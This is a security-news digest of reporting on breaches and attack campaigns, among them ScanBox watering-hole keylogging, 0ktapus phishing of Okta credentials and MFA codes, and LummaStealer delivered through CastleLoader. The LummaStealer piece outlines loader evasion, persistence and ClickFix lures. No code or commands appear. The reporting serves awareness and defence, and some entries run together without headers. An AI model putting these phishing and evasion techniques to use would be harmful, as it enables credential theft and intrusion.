In a blog post today, Unit 221B argues that no one should negotiate with SLSH because the group has demonstrated a willingness to extort victims based on promises that it has no intention to keep. Nixon points out that all of SLSH’s known members hail from The Com, shorthand for a constellation of cybercrime-focused Discord and Telegram communities which serve as a kind of distributed social network that facilitates instant collaboration.

Nixon said Com-based extortion groups tend to instigate feuds and drama between group members, leading to lying, betrayals, credibility destroying behavior, backstabbing, and sabotaging each other.

“With this type of ongoing dysfunction, often compounding by substance abuse, these threat actors often aren’t able to act with the core goal in mind of completing a successful, strategic ransom operation,” Nixon wrote. “They continually lose control with outbursts that put their strategy and operational security at risk, which severely limits their ability to build a professional, scalable, and sophisticated criminal organization network for continued successful ransoms – unlike other, more tenured and professional criminal organizations focused on ransomware alone.”

Intrusions from established ransomware groups typically center around encryption/decryption malware that mostly stays on the affected machine. In contrast, Nixon said, ransom from a Com group is often structured the same as violent sextortion schemes against minors, wherein members of The Com will steal damaging information, threaten to release it, and “promise” to delete it if the victim complies without any guarantee or technical proof point that they will keep their word. She writes:

A key component of SLSH’s efforts to convince victims to pay, Nixon said, involves manipulating the media into hyping the threat posed by this group. This approach also borrows a page from the playbook of sextortion attacks, she said, which encourages predators to keep targets continuously engaged and worrying about the consequences of non-compliance.

“On days where SLSH had no substantial criminal ‘win’ to announce, they focused on announcing death threats and harassment to keep law enforcement, journalists, and cybercrime industry professionals focused on this group,” she said.

Nixon knows a thing or two about being threatened by SLSH: For the past several months, the group’s Telegram channels have been replete with threats of physical violence against her, against Yours Truly, and against other security researchers. These threats, she said, are just another way the group seeks to generate media attention and achieve a veneer of credibility, but they are useful as indicators of compromise because SLSH members tend to name drop and malign security researchers even in their communications with victims.

“Watch for the following behaviors in their communications to you or their public statements,” Unit 221B’s advisory reads. “Repeated abusive mentions of Allison Nixon (or “A.N”), Unit 221B, or cybersecurity journalists—especially Brian Krebs—or any other cybersecurity employee, or cybersecurity company. Any threats to kill, or commit terrorism, or violence against internal employees, cybersecurity employees, investigators, and journalists.”

Unit 221B says that while the pressure campaign during an extortion attempt may be traumatizing to employees, executives, and their family members, entering into drawn-out negotiations with SLSH incentivizes the group to increase the level of harm and risk, which could include the physical safety of employees and their families.

“The breached data will never go back to the way it was, but we can assure you that the harassment will end,” Nixon said. “So, your decision to pay should be a separate issue from the harassment. We believe that when you separate these issues, you will objectively see that the best course of action to protect your interests, in both the short and long term, is to refuse payment.”

[10] Threatpost - Student Loan Breach Exposes 2.5M Records
────────────────────────────────────────────────────────────────────────────────
Tarih: Wed, 31 Aug 2022 12:57:48 +0000

[TAM METİN - 511 kelime]
2.5 million people were affected, in a breach that could spell more trouble down the line.

EdFinancial and the Oklahoma Student Loan Authority (OSLA) are notifying over 2.5 million loanees that their personal data was exposed in a data breach.

The target of the breach was Nelnet Servicing, the Lincoln, Neb.-based servicing system and web portal provider for OSLA and EdFinancial, according to a breach disclosure letter.

Nelnet revealed the breach to affected loan recipients on July 21, 2022 via a letter.

“[Our] cybersecurity team took immediate action to secure the information system, block the suspicious activity, fix the issue, and launched[sic] an investigation with third-party forensic experts to determine the nature and scope of the activity,” according to the letter.

By August 17th, the investigation determined that personal user information was accessed by an unauthorized party. That exposed information included names, home addresses, email addresses, phone numbers and social security numbers for a total of 2,501,324 student loan account holders. Users’ financial information was not exposed.

According to a breach disclosure filing submitted by Nelnet’s general counsel, Bill Munn, to the state of Maine the breach occurred sometime between June 1, 2022 and July 22, 2022. However, a letter to affected customers pinpoints the breach to July 21. The breach was discovered on August 17, 2022.

“On July 21, 2022, Nelnet Servicing, LLC (Nelnet), our servicing system and customer website

portal provider, notified us that they had discovered a vulnerability that we believe led to this incident,” according to the Nelnet.

It’s unclear what the vulnerability was.

“On August 17, 2022, this investigation determined that certain student loan account registration information was accessible by an unknown party beginning in June 2022 and ending on July 22, 2022,” according to the letter.

Loan Recipient Targets

Although users’ most sensitive financial data was protected, the personal information that was accessed in the Nelnet breach “has potential to be leveraged in future social engineering and phishing campaigns,” explained Melissa Bischoping, endpoint security research specialist at Tanium, in a statement via email.

“With recent news of student loan forgiveness, it’s reasonable to expect the occasion to be used by scammers as a gateway for criminal activity,” Bischoping said.

Last week, the Biden administration announced a plan to cancel $10,000 of student loan debt for low- and middle-income loanees. She said the loan forgiveness program will be used to lure victims into opening up phishing emails.

She warns that recently breached data will be used to impersonate affected brands in waves of phishing campaigns targeting students and recent college graduates.

“Because they can leverage the trust from existing business relationships they can be particularly deceptive,” she wrote.

According to the breach disclosure Nelnet Servicing informed Edfinancial and OSLA that Nelnet Servicing’s cybersecurity team “took immediate action to secure the information system, block the suspicious activity, fix the issue, and launched an investigation with third-party forensic experts to determine the nature and scope of the activity.”

Remediation also included two years of free credit monitoring, credit reports and up to $1 million in identity theft insurance.

[11] Threatpost - Watering Hole Attacks Push ScanBox Keylogger
────────────────────────────────────────────────────────────────────────────────
Tarih: Tue, 30 Aug 2022 16:00:43 +0000
Link: https://threatpost.com/watering-hole-attacks-push-scanbox-keylogger/180490/

[TAM METİN - 918 kelime]
Researchers uncover a watering hole attack likely carried out by APT TA423, which attempts to plant the ScanBox JavaScript-based reconnaissance tool.

A China-based threat actor has ramped up efforts to distribute the ScanBox reconnaissance framework to victims that include domestic Australian organizations and offshore energy firms in the South China Sea. The bait used by the advanced threat group (APT) is targeted messages that supposedly link back to Australian news websites.

The cyber-espionage campaigns are believed to have launched April 2022 through mid-June 2022, according to a Tuesday report by Proofpoint’s Threat Research Team and PwC’s Threat Intelligence team.

The threat actor, according to researchers, is believed to be the China-based APT TA423, also known as Red Ladon. “Proofpoint assesses with moderate confidence that this activity may be attributable to the threat actor TA423 / Red Ladon, which multiple reports assess to operate out of Hainan Island, China,” according to the report.

The APT is most recently known for a recent indictment. “A 2021 indictment by the US Department of Justice assessed that TA423 / Red Ladon provides long-running support to the Hainan Province Ministry of State Security (MSS),” researchers said.

MSS is the civilian intelligence, security and cyber police agency for the People’s Republic of China. It is believed responsible for counter-intelligence, foreign intelligence, political security and tied to industrial and cyber espionage efforts by China.

Dusting Off the ScanBox

The campaign leverages the ScanBox framework. ScanBox is a customizable and multifunctional Javascript-based framework used by adversaries to conducting covert reconnaissance.

ScanBox has been used by adversaries for nearly a decade and is noteworthy because criminals can use the tool to conduct counter intelligence without having to plant malware on a targets system.

“ScanBox is particularly dangerous as it doesn’t require malware to be successfully deployed to disk in order to steal information – the keylogging functionality simply requires the JavaScript code to be executed by a web browser,” according to PwC researchers referring to a previous campaign.

In lieu of malware, attackers can use ScanBox in conjunction with watering hole attacks. Adversaries load the malicious JavaScript onto a compromised website where the ScanBox acts as a keylogger snagging all of a user’s typed activity on the infected watering hole website.

TA423’s attacks began with phishing emails, with such titles as “Sick Leave,” “User Research” and “Request Cooperation.” Often, the emails purported to come from an employee of the “Australian Morning News,” a fictional organization. The employee implored targets to visit their “humble news website,” australianmorningnews[.]com.

“Upon clicking the link and redirecting to the site, visitors were served the ScanBox framework,” researchers wrote.

The link directed targets to a web page with content copied from actual news sites, like the BBC and Sky News. In the process, it also delivered the ScanBox malware framework.

ScanBox keylogger data culled from waterholes is part of a multi-stage attack, giving attackers insight into the potential targets that will help them launch future attacks against them. This technique is often called browser fingerprinting.

The primary, initial script sources a list of information about the target computer, including the operating system, language and version of Adobe Flash installed. ScanBox additionally runs a check for browser extensions, plugins and components such WebRTC.

“The module implements WebRTC, a free and open-source technology supported on all major browsers, which allows web browsers and mobile applications to perform real-time communication (RTC) over application programming interfaces (APIs). This allows ScanBox to connect to a set of pre-configured targets,” researchers explain.

Adversaries can then leverage a technology called STUN (Session Traversal Utilities for NAT). This is a standardized set of methods, including a network protocol, that allows interactive communications (including real-time voice, video, and messaging applications) to traverse network address translator (NAT) gateways, researchers explain.

“STUN is supported by the WebRTC protocol. Through a third-party STUN server located on the Internet, it allows hosts to discover the presence of a NAT, and to discover the mapped IP address and port number that the NAT has allocated for the application’s User Datagram Protocol (UDP) flows to remote hosts. ScanBox implements NAT traversal using STUN servers as part of Interactive Connectivity Establishment (ICE), a peer-to-peer communication method used for clients to communicate as directly as possible, avoiding having to communicate through NATs, firewalls, or other solutions,” according to researchers.

“This means that the ScanBox module can set up ICE communications to STUN servers, and communicate with victim machines even if they are behind NAT,” they explain.

The threat actors “support the Chinese government in matters related to the South China Sea, including during the recent tensions in Taiwan,” Sherrod DeGrippo, vice president of threat research and detection at Proofpoint, explained in a statement, “This group specifically wants to know who is active in the region and, while we can’t say for certain, their focus on naval issues is likely to remain a constant priority in places like Malaysia, Singapore, Taiwan, and Australia.”

The group has, in the past, expanded well beyond Australasia. According to a Department of Justice indictment from July, 2021, the group has “stolen trade secrets and confidential business information” from victims in “the United States, Austria, Cambodia, Canada, Germany, Indonesia, Malaysia, Norway, Saudi Arabia, South Africa, Switzerland and the United Kingdom. Targeted industries included, among others, aviation, defense, education, government, health care, biopharmaceutical and maritime.”

Despite the DoJ indictment, analysts “have not observed a distinct disruption of operational tempo” from TA423, and they “collectively expect TA423 / Red Ladon to continue pursuing its intelligence-gathering and espionage mission.”

[12] Threatpost - Tentacles of ‘0ktapus’ Threat Group Victimize 130 Firms
────────────────────────────────────────────────────────────────────────────────
Tarih: Mon, 29 Aug 2022 14:56:19 +0000
Link: https://threatpost.com/0ktapus-victimize-130-firms/180487/

[TAM METİN - 614 kelime]
Over 130 companies tangled in sprawling phishing campaign that spoofed a multi-factor authentication system.

Targeted attacks on Twilio and Cloudflare employees are tied to a massive phishing campaign that resulted in 9,931 accounts at over 130 organizations being compromised. The campaigns are tied to focused abuse of identity and access management firm Okta, which gained the threat actors the 0ktapus moniker, by researchers.

“The primary goal of the threat actors was to obtain Okta identity credentials and multi-factor authentication (MFA) codes from users of the targeted organizations,” wrote Group-IB researchers in a recent report. “These users received text messages containing links to phishing sites that mimicked the Okta authentication page of their organization.”

Impacted were 114 US-based firms, with additional victims of sprinkled across 68 additional countries.

Roberto Martinez, senior threat intelligence analyst at Group-IB, said the scope of the attacks is still an unknown. “The 0ktapus campaign has been incredibly successful, and the full scale of it may not be known for some time,” he said.

What the 0ktapus Hackers Wanted

The 0ktapus attackers are believed to have begun their campaign by targeting telecommunications companies in hopes of winning access to potential targets’ phone numbers.

While unsure exactly how threat actors obtained a list of phone numbers used in MFA-related attacks, one theory researchers posit is that 0ktapus attackers began their campaign targeting telecommunications companies.

“[A]ccording to the compromised data analyzed by Group-IB, the threat actors started their attacks by targeting mobile operators and telecommunications companies and could have collected the numbers from those initial attacks,” researchers wrote.

Next, attackers sent phishing links to targets via text messages. Those links led to webpages mimicking the Okta authentication page used by the target’s employer. Victims were then asked to submit Okta identity credentials in addition to a multi-factor authentication (MFA) codes employees used to secure their logins.

In an accompanying technical blog, researchers at Group-IB explain that the initial compromises of mostly software-as-a-service firms were a phase-one in a multi-pronged attack. 0ktapus’ ultimate goal was to access company mailing lists or customer-facing systems in hopes of facilitating supply-chain attacks.

In a possible related incident, within hours of Group-IB publishing its report late last week, the firm DoorDash revealed it was targeted in an attack with all the hallmarks of an 0ktapus-style attack.

Blast Radius: MFA Attacks

In a blog post DoorDash revealed; “unauthorized party used the stolen credentials of vendor employees to gain access to some of our internal tools.” The attackers, according to the post, went on to steal personal information – including names, phone numbers, email and delivery addresses – from customers and delivery people.

In the course of its campaign, the attacker compromised 5,441 MFA codes, Group-IB reported.

“Security measures such as MFA can appear secure… but it is clear that attackers can overcome them with relatively simple tools,” researchers wrote.

“This is yet another phishing attack showing how easy it is for adversaries to bypass supposedly secure multifactor authentication,” Roger Grimes, data-driven defense evangelist at KnowBe4, wrote in a statement via email. “It simply does no good to move users from easily phish-able passwords to easily phish-able MFA. It’s a lot of hard work, resources, time, and money, not to get any benefit.”

To mitigate 0ktapus-style campaigns, the researchers recommended good hygiene around URLs and passwords, and using FIDO2-compliant security keys for MFA.

“Whatever MFA someone uses,” Grimes advised, “the user should be taught about the common types of attacks that are committed against their form of MFA, how to recognize those attacks, and how to respond. We do the same when we tell users to pick passwords but don’t when we tell them to use supposedly more secure MFA.”

Hackers broke into Dutch telecom firm Odido and accessed data from 6.2 million accounts. The company confirmed the breach and said attackers took names, addresses, phone numbers, email addresses, bank account details, dates of birth, and passport or ID numbers.

“Odido has been hit by a cyberattack, which compromised customer data. This involved personal data from a customer contact system used by Odido. No passwords, call logs, or billing information were affected.” reads a notice published by the company on its website. “The unauthorized access to the system was terminated as quickly as possible. Odido also engaged external cybersecurity experts to assist with implementing additional security measures as part of the incident response.”

The telco said the breach did not expose My Odido account passwords, call records, location data, invoice details, or scans of ID documents.

Odido’s subsidiary Ben also warned its customers that hackers may have stolen their information.

Odido is a Dutch telecommunications company and one of the largest mobile network operators in the Netherlands. It was formed when T-Mobile Netherlands and Tele2 were rebranded as Odido in 2023 after private equity firms Apax Partners and Warburg Pincus acquired the business.

Odido serves around 8 million mobile subscribers and about 1 million fixed broadband customers nationwide. The company provides mobile telephony, wireless broadband, and related services under multiple brands including Odido, Ben, and Simpel.

Financially, Odido generates around €2 billion in annual revenue, with growth in consumer broadband and business mobile services contributing to its topline

The telco discovered the hack last weekend and reported it to the Dutch privacy watchdog. The company said it quickly stopped the unauthorized access and brought in cybersecurity experts to strengthen its defenses.

“The unauthorised access to the system was ended as quickly as possible,” the company said in a statement. “In addition, Odido has brought in cybersecurity experts to implement additional security measures in response to this incident.”

The company urges customers to stay alert for suspicious activity. Criminals may use stolen details to pose as Odido, banks, or other companies through calls, texts, or emails. Avoid clicking unknown links and check senders carefully. Verify unexpected calls by contacting the company directly using official numbers. Never share passwords or PINs. Review invoices closely, as scammers may send fake payment requests. When in doubt, check your account or contact customer support.

The company did not disclose technical details about the attack.

ApolloMD is a US-based healthcare services company that partners with hospitals, health systems, and physician practices. It provides practice management, staffing, revenue cycle, and administrative support services. The company works with affiliated physicians across specialties such as emergency medicine, hospital medicine, anesthesia, and radiology, helping providers manage clinical and operational functions.

ApolloMD disclosed a data breach after a May 2025 cyberattack. The security breach compromised the personal information of more than 626,000 individuals, impacting patients of affiliated physicians and medical practices served by the healthcare management provider.

According to data published by the US Department of Health and Human Services, the exact number of impacted people is 626,540.

Hackers accessed and stole sensitive data, prompting the company to notify impacted individuals.

The company detected unusual activity on May 22, 2025, and launched an investigation with the help of a forensic firm and notified law enforcement. Investigators found that an unauthorized party gained unauthorized access to its IT systems between May 22 and 23, including patient files. The exposed data varies by individual and includes names, birth dates, addresses, diagnoses, treatment details, insurance data, and in some cases Social Security numbers.

ApolloMD notified managed physician practices between July and September 2025.

“Our investigation determined that an unauthorized party accessed ApolloMD’s IT environment between May 22, 2025 and May 23, 2025. While in the IT environment, the unauthorized party may have accessed and/or acquired files that contain information for patients treated by ApolloMD’s affiliated physicians and practices. The information involved varied by patient and includes names in combination with one or more of the following: dates of birth, addresses, diagnosis information, provider names, dates of service, treatment information, and/or health insurance information. For some individuals, the incident may have also involved their Social Security numbers.” reads the notice of security breach published by the company. “On September 17, 2025, notification letters began being mailed to patients whose information may have been involved in the incident.”

ApolloMD did not publish technical details about the incident, however, the Qilin ransomware group claimed the data breach in June 2025.

[15] Security Affairs - LummaStealer activity spikes post-law enforcement disruption
────────────────────────────────────────────────────────────────────────────────
Tarih: Thu, 12 Feb 2026 14:57:44 +0000
Link: https://securityaffairs.com/187896/uncategorized/lummastealer-activity-spikes-post-law-enforcement-disruption.html

[TAM METİN - 672 kelime]
Bitdefender observed renewed LummaStealer activity, proving the MaaS infostealer recovered after 2025 takedowns. Active since 2022, it relies on affiliates, social engineering, fake cracked software, and fake CAPTCHA “ClickFix” lures. CastleLoader plays a key role in spreading it. Shared infrastructure suggests coordination between the two operations.

In May 2025, a US court order, with Europol and Japan’s JC3 dismantled the Lumma Stealer malware operation, seizing 2,300 domains used for command-and-control and blocking dark web markets offering the infostealer.

A US court order, with Europol and Japan’s JC3, dismantled Lumma Stealer’s infrastructure, seizing domains and control panels. Microsoft’s Digital Crimes Unit sinkholed over 1,300 domains to reroute victims to safe servers for analysis and cleanup.

Lumma Stealer is a Malware-as-a-Service (MaaS) infostealer designed to steal sensitive data like passwords, credit card info, and crypto wallet keys. It infiltrates systems via phishing, malvertising, and malicious downloads. It can also deploy additional malware and evade detection.

The malware had infected over 394,000 Windows systems, including those of global manufacturers.

Microsoft observed Lumma Stealer’s rapid growth and sophistication as a MaaS used by financially motivated threat actors. Distributed via phishing, malvertising, and abuse of trusted platforms, Lumma targets browsers, wallets, and apps. Lumma’s flexibility and resilience highlight the evolving cybercrime landscape and the need for layered, collaborative defense efforts.

Microsoft tracks the developer of Lumma Stealer and its C2 infrastructure as threat actor Storm-2477. Ransomware groups like Octo Tempest, Storm-1607, Storm-1113, and Storm-1674 have used Lumma in their campaigns.

Now Bitdefender researchers report a sharp rise in LummaStealer infections driven by evolving social engineering tricks, including fake CAPTCHAs and bogus Steam update alerts. Attackers frequently change loaders, recently favoring CastleLoader, a stealthy, in-memory tool with modular design and large C2 infrastructure. Analysts found infrastructure overlap between CastleLoader and Lumma operations, suggesting coordination or shared services. The research details delivery methods, indicators of compromise, and ways to detect recent CastleLoader activity.

“Recently, we have observed a considerable increase in LummaStealer activity in our insights. Loaders are typically delivered through evolving social-engineering lures, ranging from fake CAPTCHA challenges to bogus update notifications on Steam pages and game development websites.” reads the report published by Bitdefender. “The loaders themselves change frequently; we’ve seen LummaStealer using Rugmi, DonutLoader, and, more recently, CastleLoader for initial execution.”

CastleLoader is a script-based loader, often compiled with AutoIt, that decrypts and runs payloads directly in memory. Authors of the loader hide its logic with heavy obfuscation, renamed variables, and junk code. The loader checks for sandboxes and security tools, adjusts behavior to evade detection, and creates persistence by copying itself and the AutoIt interpreter, then adding a startup shortcut. A failed ping to a fake random domain leaves a detectable DNS trace. Finally, it uses layered XOR decryption and decompression to load and execute LummaStealer or another payload in memory.

Bitdefender reported that the campaigns rely on social engineering, not exploits. Victims download fake cracked software, game installers, movies, or adult content, often packaged as self-extracting archives or NSIS installers. When run, these files unpack and launch CastleLoader, which then delivers LummaStealer. Attackers abuse trusted platforms like Steam and Discord to boost credibility. ClickFix pages trick users into pasting malicious PowerShell commands. Some chains observed by the researchers add obfuscated VBA scripts and scheduled tasks for persistence.

LummaStealer is active worldwide, especially in India, the US, and Europe.

The distribution shifts based on customer targets because it steals credentials, browser sessions, financial info, crypto wallets, personal documents, and images, enabling account takeovers, fraud, identity theft, and blackmail.

Mitigations include avoiding untrusted downloads, never running manual commands, changing passwords, using multi-factor authentication, and monitoring for suspicious behavior and loader activity.

“LummaStealer remains a significant and evolving threat due to its combination of effective social engineering, flexible loader infrastructure, and a well-established MaaS ecosystem.” concludes the report. “The continued use of loaders such as CastleLoader, along with techniques like ClickFix, demonstrates a strategic shift toward delivery mechanisms that are difficult to disrupt through traditional technical defenses alone.”

[16] Graham Cluley - Polish hacker charged seven years after massive Morele.net data breach
────────────────────────────────────────────────────────────────────────────────

Link: https://www.bitdefender.com/en-us/blog/hotforsecurity/polish-hacker-charged-seven-years-after-massive-morele-net-data-breach

[TAM METİN - 409 kelime]
A 29-year-old Polish man has been charged in connection with a data breach that exposed the personal details of around 2.5 million customers of the popular Polish e-commerce website Morele.net.

Poland's Central Cybercrime Bureau (CBZC) announced that charges were filed on 30 January 2026, following years of investigation into the 2018 breach of Morele.net, that specialises in electronics, computer equipment and home appliances.

The high-profile breach of Morele.net, whose international equivalents include the likes of Best Buy, Newegg, and Amazon, sent shockwaves through Poland's online retail sector.

The investigation into the data breach had originally been shelves after police failed to identify a suspect, but authorities claim that the trail never went entirely cold.

Over time investigators identified the attack vector, reconstructed the sequence of events, and traced digital breadcrumbs back to the alleged hacker - demonstrating their determination in a YouTube video.

According to a CBZC press release, the suspect has admitted responsibility for the hack.

The cyber attack exposed names, email addresses, phone numbers, home addresses, and md5crypt-hashed passwords. Although payment card details were not compromised in the breach, it was reported that some 35,000 customers did have particularly sensitive information stolen, including national ID numbers, financial details, education information, income, and marital status.

Morele.net refused to pay a ransom, and the breached database was published online.

Unfortunately for the site's users who had their information breached, fraudsters weaponised the stolen data immediately. Victims reported receiving SMS messages demanding payment of 1 Polish zloty to "complete" their orders, accompanied by phishing links that stole banking credentials.

In 2019, in what was one of the country's largest GDPR-related fines at the time, Poland's data protection authority regulator hit Morele.net to the tune of €645,000, claiming that had failed to detect and respond to unusual network traffic.

Morele.net contested the fine, arguing that its security measures were reasonable even if they ultimately proved insufficient against a determined attacker, and eventually Poland's Supreme Administrative Court annulled the penalty, saying it had finding deficiencies in the regulator's justification and calculation of the fine.

Now, however, it is the alleged hacker who will be hoping he can escape receiving a heavy punishment.

If anything, this case serves as a timely reminder to cybercriminals that they should not assume that they have evaded justice just because years have passed since their offence. Digital forensics techniques continue to improve, and law enforcement agencies are increasingly willing to pursue cold cases when new leads emerge.

AI bots are having existential crises, inventing religions, and allegedly plotting against humanity… or so the internet would have you believe.

We dig into Moltbook, the “AI-only” social network that sent Twitter into a meltdown, attracted breathless talk of the singularity, and turned out to be far less Terminator and far more humans role-playing as bots.

Plus we discuss why “vibe coding” your app might be a catastrophically bad idea, when security researchers can easily peek inside rifle through your private messages, API keys, and databases.

Also this week we learn that pro-Russian hackers are circling the Winter Olympics – or is it the Jamaican Bobsleigh team?

All this and more is discussed in episode 454 of the “Smashing Security” podcast with cybersecurity veteran Graham Cluley, and special guest Iain Thomson.

[18] Graham Cluley - Fake Dubai Crown Prince tracked to Nigerian mansion after $2.5M romance scam
────────────────────────────────────────────────────────────────────────────────
Tarih: Sat, 07 Feb 2026 13:19:52 +0000
Link: https://www.bitdefender.com/en-us/blog/hotforsecurity/fake-dubai-crown-prince-tracked-to-nigerian-mansion-after-2-5m-romance-scam

[TAM METİN - 653 kelime]
An investigation has tracked down a sophisticated scammer who posed as Dubai's Crown Prince in a succesful plot to defraud a Romanian businesswoman out of over US $2.5 million.

That in itself, sadly, is probably not that shocking a story. But what the Organised Crime and Corruption Reporting Project (OCCRP) discovered was that in this particular case the perpetrators presented themselves in the public eye as philanthropists, while secretly destroying victims' lives.

The victim, Laura (not her real name), was a successful Romanian businesswoman when she received a LinkedIn message three years ago from someone claiming to be the Crown Prince of Dubai.

The man said that he wanted her assistance in investing a large amount fo money in a humanitarian foundation in Romania. What followed was a textbook example of how modern romance scams can operate.

Over the next two years, the pair exchanged thousands of messages as a virtual romance developed. Meanwhile, Laura met a man who claimed to be the "Prince's financial manager" in London, where she was given login credentials to a bank account showing a deposit of over £200 million. The banking website was, of course, an elaborate fake.

Fortuitously, a friend of Laura's had helpfully photographed her meeting the "financial manager" - a snap that would later prove crucial.

Laura tried to withdraw funds from the account, only to receive demands for large fees to release "the Prince's funds." As Laura had already sent hundreds of thousands of dollars to her online beau, she kept on paying, believing that it was the only way to recover her money.

In total, she sent over US $2.5 million before realising that she had fallen victim to a con.

But things were not to go all the scammer's way. The fake prince had partners helping move the money, but they fell out over how the spoils of the scam should be divided. Ultimately they made contact with Laura, exposing the fraud and revealing the fake prince's real name: Nzube Henry Ikeji.

Laura was also sent videos of Ikeji at his newly-purchased mansion in Abuja, Nigeria.

Armed with this information, reporters from OCCRP travelled to Nigeria to track the scammer down.

Nigeria does not have extensive Google Street View coverage or complete property registries, and so OCCRP's Chikezie Omeje resorted to old-fashioned methods to locate Ikeji's mansion - spending days driving around Abuja until he found the matching mansion.

Meanwhile, the photograph taken by Laura's friend in London was shared with British police, who recognised the "financial manager" as Dr. Martins Abhulimhen, who they had coincidentally been investigating over suspicious bank transactions. These transactions, it transpired, were Laura's money, which police traced from Dr. Abhulimhen all the way to Nigeria and Ikeji himself.

But rather than hiding in the darkness like some shadowy criminal, Dr. Abhulimhen presented himself as a globe-trotting philanthropist and businessman, rubbing shoulders with powerful Nigerian officials and international figures. Until recently, for instance, he ran a foundation which campaigned against gender-based violence.

Bizarrely, Ikeji also runs a Nigerian humanitarian foundation, and according to British police some of Laura's stolen funds went directly to this charity.

A UK court has since returned to Laura over £113,000from Dr. Martins Abhulimhen's frozen bank accounts, but Laura has been told that any criminal investigation into her case would need to be led by Romanian authorities.

Laura's case may be extreme, but it's far from unique. Romance and investment scams have escalated worldwide, with organised crime syndicates recognising that online fraud can be a lucrative, easy, and comparatively safe way to make millions.

The FBI's Internet Crime Complaint Center consistently ranks romance scams amongst the costliest forms of cybercrime, whilst UK victims lost over £92 million to romance fraud in 2023 alone.

Whether Ikeji or Dr. Abhulimhen will face justice remains unclear. But at least one fake prince has discovered that his Nigerian mansion offers rather less sanctuary than he had hoped.

[19] SANS ISC - AI-Powered Knowledge Graph Generator &#x26; APTs, (Thu, Feb 12th)

AI-Powered Knowledge Graph Generator & APTs

Unstructured text to interactive knowledge graph via LLM & SPO triplet extraction

Courtesy of TLDR InfoSec Launches & Tools again, another fine discovery in Robert McDermott’s AI Powered Knowledge Graph Generator. Robert’s system takes unstructured text, uses your preferred LLM and extracts knowledge in the form of Subject-Predicate-Object (SPO) triplets, then visualizes the relationships as an interactive knowledge graph.[1]

Robert has documented AI Powered Knowledge Graph Generator (AIKG) beautifully, I’ll not be regurgitating it needlessly, so please read further for details regarding features, requirements, configuration, and options. I will detail a few installation insights that got me up and running quickly.
The feature summary is this:
AIKG automatically splits large documents into manageable chunks for processing and uses AI to identify entities and their relationships. As AIKG ensures consistent entity naming across document chunks, it discovers additional relationships between disconnected parts of the graph, then creates an interactive graph visualization. AIKG works with any OpenAI-compatible API endpoint; I used Ollama exclusively here with Google’s Gemma 3, a lightweight family of models built on Gemini technology. Gemma 3 is multimodal, processing text and images, and is the current, most capable model that runs on a single GPU. I ran my experimemts on a Lenovo ThinkBook 14 G4 circa 2022 with an AMD Ryzen 7 5825U 8-core processor, Radeon Graphics, and 40gb memory running Ubuntu 24.04.3 LTS.
My installation guidelines assume you have a full instance of Python3 and Ollama installed. My installation was implemented under my tools directory.

I opted to test AIKG via a couple of articles specific to Russian state-sponsored adversarial cyber campaigns as input:

CISA’s Cybersecurity Advisory Russian GRU Targeting Western Logistics Entities and Technology Companies May 2025

SecurityWeek’s Russia’s APT28 Targeting Energy Research, Defense Collaboration Entities January 2026

My use of these articles in particular was based on the assertion that APT and nation state activity is often well represented via interactive knowledge graph. I’ve advocated endlessly for visual link analysis and graph tech, including Maltego (the OG of knowledge graph tools) at far back as 2009, Graphviz in 2015, GraphFrames in 2018 and Beagle in 2019. As always, visualization, coupled with entity relationship mappings, are an imperative for security analysts, threat hunters, and any security professional seeking deeper and more meaningful insights. While the SecurityWeek piece is a bit light on content and density, it served well as a good initial experiment.
The CISA advisory is much more dense and served as an excellent, more extensive experiment.
I pulled them both into individual text files more easily ingested for processing with AIKG, shared for you here if you’d like to play along at home.

Starting with SecurityWeek’s Russia’s APT28 Targeting Energy Research, Defense Collaboration Entities, and the subsequent Russia-APT28-targeting.txt file I created for model ingestion, I ran Gemma 3 as a 12 billion parameter model as follows:

You may want or need to run Gemma 3 with fewer parameters depending on the performance and capabilities of your local system. Note that I am calling file paths rather explicitly to overcome complaints about missing config and input files.
The article makes reference to APT credential harvesting activity targeting people associated with a Turkish energy and nuclear research agency, as well as a spoofed OWA login portal containing Turkish-language text to target Turkish scientists and researchers. As part of it’s use of semantic triples (Subject-Predicate-Object (SPO) triplets), how does AIKG perform linking entities, attributes and values into machine readable statements [2] derived from the article content, as seen in Figure 1?

Figure 1: AIKG Gemma 3:12b result from SecurityWeek article

Quite well, I’d say. To manipulate the graph, you may opt to disable physics in the graph output toolbar so you can tweak node placements. As drawn from the statistics view for this graph, AIKG generated 38 nodes, 105 edges, 52 extracted edges, 53 inferred edges, and four communities. You can further filter as you see fit, but even unfiltered, and with just a little by of tuning at the presentation layer, we can immediately see success where semantic triples immediately emerge to excellent effect. We can see entity/relationship connections where, as an example, threat actor –> targeted –> people and people –> associated with –> think tanks, with direct reference to the aforementioned OWA portal and Turkish language. If you’re a cyberthreat intelligence analyst (CTI) or investigator, drawing visual conclusions derived from text processing will really help you step up your game in the form of context and enrichment in report writing. This same graph extends itself to represent the connection between the victims and the exploitation methods and infrastructure. If you don’t want to go through a full installation process for yourself to complete your own model execution, you should still grab the JSON and HTML output files and experiment with them in your browser. You’ll get a real sense of the power and impact of an interactive knowledge graph with the joint forces power of LLM and SPO triplets.
For a second experiment I selected related content in a longer, more in depth analysis courtesy of a CISA Cybersecurity Advisory (CISA friends, I’m pulling for you in tough times). If you are following along at home, be sure to exit ollama so you can rerun it with additional parameters (27b vs 12b); pass /bye as a message, and restart:

Given the density and length of this article, the graph as initially rendered is a bit untenable (no fault of AIKG) and requires some tuning and filtering for optimal effect. Graph Statistics for this experiment included 118 nodes, 486 edges, 152 extracted edges, 334 inferred edges, and seven communities. To filter, with a focus again on actions taken by Russian APT operatives, I chose as follows:

Select a Node by ID: threat actors

Select a network item: Nodes

Select a property: color

Select value(s): #e41a1c (red)

The result is more visually feasible, and allows ready tweaking to optimize network connections, as seen in Figure 2.

Figure 2: AIKG Gemma 3:27b result from CISA advisory

Shocking absolutely no one, we immediately encapsulate actor activity specific to credential access and influence operations via shell commands, Active Directory commands, and PowerShell commands. The conclusive connection is drawn however as threat actors –> targets –> defense industry. Ya think? ;-) In the advisory, see Description of Targets, including defense industry, as well as Initial Access TTPs, including credential guessing and brute force, and finally Post-Compromise TTPs and Exfiltration regarding various shell and AD commands. As a security professional reading this treatise, its reasonable to assume you’ve read a CISA Cybersecurity Advisory before. As such, its also reasonable to assume you’ll agree that knowledge graph generation from a highly dense, content rich collection of IOCs and behaviors is highly useful. I intend to work with my workplace ML team to further incorporate the principles explored herein as part of our context and enrichment generation practices. I suggest you consider the same if you have the opportunity. While SPO triplets, aka semantic triples, are most often associated with search engine optimization (SEO), their use, coupled with LLM power, really shines for threat intelligence applications.

Cheers…until next time.

2026 State of Security

